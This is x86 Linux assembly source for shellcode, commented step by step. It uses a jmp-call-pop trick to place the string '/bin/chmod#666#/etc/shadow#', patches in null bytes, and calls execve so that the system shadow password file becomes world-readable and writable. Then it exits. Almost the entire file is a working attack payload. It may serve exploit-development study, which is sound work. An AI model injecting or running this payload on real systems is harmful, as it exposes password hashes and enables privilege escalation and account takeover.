.section .data
.section .text				# begin text section of code
	.globl _start			# declare _start
_start:					# begin _start (main codeblock)
	xor		%eax, %eax	# xor eax register
	jmp		caller		# jmp to 'caller'
shellcode:
	pop		%esi

	# Processing the string from caller
	xor		%eax, %eax	# xor/null eax register in order to use eax to null placeholders next
	movb	%al, 10(%esi)		# we place a NULL byte from lower-eax register to the place where our first marker '#' is
	movb	%al, 14(%esi)		# same with the second
	movb	%al, 26(%esi)		# again... with the third

	# Preparing param's for syscall
	# 27(%esi) :	'/bin/chmod'
	# 31(%esi) :	'666'
	# 39(%esi) :	'/etc/shadow'
	movl	%esi, 27(%esi)		# storing of '/bin/chmod' at 27(%esi)
	leal	11(%esi), %edi		# calc addr of '666' and mov to %edi
	movl	%edi, 31(%esi)		# this is then put in 31(%esi)
	leal	15(%esi), %edi		# same process again with '/etc/shadow'
	movl	%edi, 35(%esi)		# again value at %edi it moved to 35(%esi)
	movl	%eax, 39(%esi)		# the value at 39(%esi) is nulled out.

	# int execve(const char *filename, char *const argv[], char *const envp[]);
	# We are trying to achieve:
	# execve('/bin/chmod','666' '/etc/shadow', NULL)
	# effectively executing: '/bin/chmod 666 /etc/shadow'
	movb	$11, %al            	# set syscall to 11 [execve()]
	movl	%esi, %ebx		# move '/bin/chmod' to ebx
	leal	27(%esi), %ecx		# store value at 27(%esi) in ecx
	leal	39(%esi), %edx		# store value at 39(%esi) in edx
	int		$0x80		# execute above

	# void exit(int status);
	# effectively executing : 'exit(0)'
	xor		%eax, %eax	# xor eax register
	movb	$1, %al			# set syscall to 1 [exit()]
	xor		%ebx, %ebx	# xor ebx register
	int		$0x80		# execute above, exit(0)
caller:					# declare caller codeblock
	call	shellcode           	# goto 'shellcode'
	.ascii	"/bin/chmod#666#/etc/shadow#"	# declaration of our ascii string
